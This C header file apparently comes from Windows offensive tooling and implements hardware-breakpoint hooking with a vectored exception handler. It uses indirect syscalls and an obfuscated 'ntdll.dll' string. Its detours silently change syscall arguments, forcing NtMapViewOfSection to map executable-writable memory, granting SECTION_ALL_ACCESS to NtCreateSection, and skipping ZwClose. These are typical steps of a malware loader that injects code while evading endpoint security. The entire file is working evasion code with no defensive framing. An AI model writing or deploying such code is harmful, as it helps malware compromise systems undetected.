#pragma once

#include <Windows.h>
#include "syscalls.h"

//retrieve syscall instructions address
PBYTE retrieveRETAddr(PBYTE funcStar) {

    int emergencybreak = 0;
    while (emergencybreak < 2048) {
        //taking into account indianess crazyness
        if (funcStar[0] == 0xc3) {

            return funcStar;
        }
        funcStar++;
        emergencybreak++;
    }
    return NULL;
}


/*--------------HARDWARE BREAKPOINT MANAGEMENT---------------------*/


unsigned long long SetDr7Bits(unsigned long long CurrentDr7Register, int StartingBitPosition, int NmbrOfBitsToModify, unsigned long long NewBitValue) {
    unsigned long long mask = (1UL << NmbrOfBitsToModify) - 1UL;
    unsigned long long NewDr7Register = (CurrentDr7Register & ~(mask << StartingBitPosition)) | (NewBitValue << StartingBitPosition);

    return NewDr7Register;
}

VOID NtMapViewOfSectionDetour(PCONTEXT pThreadCtx) {


    *(ULONG_PTR*)(pThreadCtx->Rsp + 80) = PAGE_EXECUTE_READWRITE;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID NtCreateSectionDetour(PCONTEXT pThreadCtx) {


    pThreadCtx->Rdx = SECTION_ALL_ACCESS;

    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID ZwCloseDetour(PCONTEXT pThreadCtx) {

    //need to find the address of a C3 instruction within an executable memory range
    pThreadCtx->Rip = (ULONG_PTR)retrieveRETAddr((PBYTE)ZwCloseDetour);
    //resuming the execution
    pThreadCtx->EFlags = pThreadCtx->EFlags | (1 << 16);
}

VOID unsetHardwareBreakpoint(int Dr) {

    CONTEXT ThreadCtx = { 0 };
    SYSCALL_ENTRY zwFunctions[AmountofSyscalls] = { 0 };
    WCHAR ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
    RetrieveZwFunctions(GMHR(ntdll), zwFunctions);
    ThreadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    ZwGetContextThread((HANDLE)-2, &ThreadCtx, zwFunctions[ZwGetContextThreadF].SSN, zwFunctions[ZwGetContextThreadF].sysretAddr);

    switch (Dr) {
    case 1: {
        ThreadCtx.Dr1 = (DWORD64)0x00;
        ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 2, 1, 0);
        break;
    }
    case 2: {
        ThreadCtx.Dr2 = (DWORD64)0x00;
        ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 4, 1, 0);
        break;
    }
    case 3: {
        ThreadCtx.Dr3 = (DWORD64)0x00;
        ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 6, 1, 0);
        break;
    }
    }



    ZwSetContextThread((HANDLE)-2, &ThreadCtx, zwFunctions[ZwSetContextThreadF].SSN, zwFunctions[ZwSetContextThreadF].sysretAddr);
}

VOID setHardwareBreakpoint(PVOID toBeHooked, PVOID toBeHookedD, PVOID toBeHookedT, PSYSCALL_ENTRY zwFunctions) {

    CONTEXT ThreadCtx = { 0 };
    ThreadCtx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    ZwGetContextThread((HANDLE)-2, &ThreadCtx, zwFunctions[ZwGetContextThreadF].SSN, zwFunctions[ZwGetContextThreadF].sysretAddr);

    ThreadCtx.Dr1 = (DWORD64)toBeHooked;
    ThreadCtx.Dr2 = (DWORD64)toBeHookedD;
    ThreadCtx.Dr3 = (DWORD64)toBeHookedT;

    //ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 6, 1);
    ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 2, 1, 1);
    ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 4, 1, 1);
    ThreadCtx.Dr7 = SetDr7Bits(ThreadCtx.Dr7, 6, 1, 1);

    ZwSetContextThread((HANDLE)-2, &ThreadCtx, zwFunctions[ZwSetContextThreadF].SSN, zwFunctions[ZwSetContextThreadF].sysretAddr);
}

LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {

    //(ZwCloseAddress, NtMapViewOfSectionAddress, NtCreateSectionAddress);
    if (pExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)pExceptionInfo->ContextRecord->Dr1) {

            unsetHardwareBreakpoint(1);

            ZwCloseDetour(pExceptionInfo->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }


        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)pExceptionInfo->ContextRecord->Dr2) {

            unsetHardwareBreakpoint(2);

            NtMapViewOfSectionDetour(pExceptionInfo->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }

        if (pExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)pExceptionInfo->ContextRecord->Dr3) {

            unsetHardwareBreakpoint(3);

            NtCreateSectionDetour(pExceptionInfo->ContextRecord);

            return EXCEPTION_CONTINUE_EXECUTION;

        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

